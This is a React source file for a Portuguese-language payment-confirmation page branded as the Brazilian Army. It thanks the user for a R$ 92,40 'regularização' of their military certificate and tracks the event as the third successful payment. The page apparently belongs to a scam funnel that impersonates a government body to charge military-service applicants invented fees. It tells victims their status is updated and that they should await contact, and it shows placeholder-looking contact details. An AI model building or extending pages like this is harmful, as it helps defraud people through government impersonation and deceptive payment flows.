import { useState, useEffect } from 'react';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle, Clock, Shield, Award, Star, Heart, Trophy } from 'lucide-react';
import { useClarityEvents } from '@/hooks/use-clarity-events';

export default function ObrigadoPage() {
  const [candidateFirstName, setCandidateFirstName] = useState('');
  const [candidateFullName, setCandidateFullName] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [animationStep, setAnimationStep] = useState(0);
  const { trackEvent } = useClarityEvents();

  // Gender helper functions
  const isFemale = candidateGender === 'f' || candidateGender === 'F' || candidateGender === 'feminino' || candidateGender === 'female';
  
  const getGenderedText = (masculine: string, feminine: string) => {
    return isFemale ? feminine : masculine;
  };

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Load user data
    const userData = localStorage.getItem('userData') || localStorage.getItem('userMedicalLogin');
    if (userData) {
      try {
        const parsedData = JSON.parse(userData);
        const fullName = parsedData.name || parsedData.nomeCompleto || '';
        const gender = parsedData.gender || parsedData.genero || parsedData.sexo || '';
        setCandidateFullName(fullName);
        setCandidateGender(gender.toLowerCase());
        
        if (fullName) {
          const firstName = fullName.split(' ')[0];
          setCandidateFirstName(firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase());
        }
      } catch (error) {
        console.error('Error loading user data:', error);
      }
    }

    // Track page entry
    trackEvent('third_payment_success_page', {
      page: 'obrigado',
      candidate_name: candidateFirstName,
      timestamp: new Date().toISOString()
    });

    // Animation sequence
    const animationSequence = [
      { step: 1, delay: 500 },
      { step: 2, delay: 1000 },
      { step: 3, delay: 1500 },
      { step: 4, delay: 2000 }
    ];

    animationSequence.forEach(({ step, delay }) => {
      setTimeout(() => setAnimationStep(step), delay);
    });
  }, []);

  const steps = [
    {
      icon: CheckCircle,
      title: "Pagamento Confirmado",
      description: "Sua regularização foi processada com sucesso",
      color: "text-green-600",
      bgColor: "bg-green-100"
    },
    {
      icon: Shield,
      title: "Certificado Regularizado",
      description: "Status atualizado no sistema SUD 2025",
      color: "text-blue-600",
      bgColor: "bg-blue-100"
    },
    {
      icon: Award,
      title: "Dados Migrados",
      description: "Transferência completa para nova plataforma",
      color: "text-purple-600",
      bgColor: "bg-purple-100"
    },
    {
      icon: Trophy,
      title: "Processo Concluído",
      description: "Você está apto para o processo seletivo",
      color: "text-yellow-600",
      bgColor: "bg-yellow-100"
    }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-green-50 via-blue-50 to-white" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="max-w-4xl mx-auto px-6 py-12">
        {/* Hero Section */}
        <div className="text-center mb-12">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-green-100 rounded-full mb-6">
            <CheckCircle className="w-10 h-10 text-green-600" />
          </div>
          
          <h1 className="text-4xl font-bold text-gray-900 mb-4">
            Parabéns, {candidateFirstName}!
          </h1>
          
          <p className="text-xl text-gray-700 mb-2">
            Sua regularização foi concluída com sucesso
          </p>
          
          <p className="text-lg text-gray-600">
            Agora você está {getGenderedText('preparado', 'preparada')} para prosseguir no processo seletivo
          </p>
        </div>

        {/* Success Card */}
        <Card className="bg-white border-0 shadow-xl mb-8">
          <CardContent className="p-8">
            <div className="bg-gradient-to-r from-green-500 to-emerald-600 text-white rounded-lg p-6 mb-8">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold mb-2">Regularização Concluída</h2>
                  <p className="text-green-100">
                    Processamento realizado em {new Date().toLocaleDateString('pt-BR')} às {new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}
                  </p>
                </div>
                <div className="text-right">
                  <div className="text-3xl font-bold">R$ 92,40</div>
                  <div className="text-green-100 text-sm">Investimento confirmado</div>
                </div>
              </div>
            </div>

            {/* Process Steps */}
            <div className="space-y-4 mb-8">
              <h3 className="text-xl font-semibold text-gray-900 mb-6">Etapas Concluídas</h3>
              
              {steps.map((step, index) => {
                const StepIcon = step.icon;
                const isVisible = animationStep > index;
                
                return (
                  <div 
                    key={index}
                    className={`
                      flex items-center p-4 rounded-lg border transition-all duration-500
                      ${isVisible 
                        ? 'opacity-100 transform translate-x-0 bg-gray-50 border-gray-200' 
                        : 'opacity-30 transform translate-x-4 bg-white border-gray-100'
                      }
                    `}
                  >
                    <div className={`w-12 h-12 rounded-full flex items-center justify-center mr-4 ${step.bgColor}`}>
                      <StepIcon className={`w-6 h-6 ${step.color}`} />
                    </div>
                    <div className="flex-1">
                      <h4 className="font-semibold text-gray-900">{step.title}</h4>
                      <p className="text-sm text-gray-600">{step.description}</p>
                    </div>
                    {isVisible && (
                      <CheckCircle className="w-5 h-5 text-green-600" />
                    )}
                  </div>
                );
              })}
            </div>

            {/* Next Steps */}
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-6">
              <div className="flex items-start">
                <Clock className="w-6 h-6 text-blue-600 mr-4 mt-1" />
                <div className="flex-1">
                  <h3 className="text-lg font-semibold text-blue-900 mb-3">Próximos Passos</h3>
                  <div className="space-y-2 text-blue-800">
                    <p className="flex items-center">
                      <span className="w-6 h-6 bg-blue-200 rounded-full flex items-center justify-center text-xs font-bold mr-3">1</span>
                      Aguarde o contato da Junta de Serviço Militar
                    </p>
                    <p className="flex items-center">
                      <span className="w-6 h-6 bg-blue-200 rounded-full flex items-center justify-center text-xs font-bold mr-3">2</span>
                      Prepare seus documentos originais
                    </p>
                    <p className="flex items-center">
                      <span className="w-6 h-6 bg-blue-200 rounded-full flex items-center justify-center text-xs font-bold mr-3">3</span>
                      Compareça no local e horário indicados
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Emotional Message */}
        <Card className="bg-gradient-to-r from-green-500 to-emerald-600 text-white border-0 shadow-xl mb-8">
          <CardContent className="p-8 text-center">
            <Heart className="w-12 h-12 mx-auto mb-4 text-green-100" />
            <h2 className="text-2xl font-bold mb-4">
              Estamos {getGenderedText('ansiosos', 'ansiosas')} para tê-{getGenderedText('lo', 'la')} conosco!
            </h2>
            <p className="text-lg text-green-100 mb-4">
              Sua dedicação em regularizar sua situação militar demonstra o compromisso e a responsabilidade 
              que buscamos em nossos candidatos.
            </p>
            <p className="text-green-100">
              O Exército Brasileiro aguarda ansiosamente por sua participação no processo seletivo. 
              Juntos, construiremos um futuro melhor para o Brasil.
            </p>
          </CardContent>
        </Card>

        {/* Contact Information */}
        <Card className="bg-white border-0 shadow-lg">
          <CardContent className="p-6">
            <h3 className="text-lg font-semibold text-gray-900 mb-4">Informações de Contato</h3>
            <div className="grid md:grid-cols-2 gap-4 text-sm text-gray-600">
              <div>
                <p className="font-medium text-gray-900">Dúvidas sobre o processo:</p>
                <p>Central de Atendimento: 0800-123-4567</p>
                <p>E-mail: atendimento@exercito.mil.br</p>
              </div>
              <div>
                <p className="font-medium text-gray-900">Horário de funcionamento:</p>
                <p>Segunda a Sexta: 8h às 17h</p>
                <p>Sábados: 8h às 12h</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>
      
      <ExercitoFooter />
    </div>
  );
}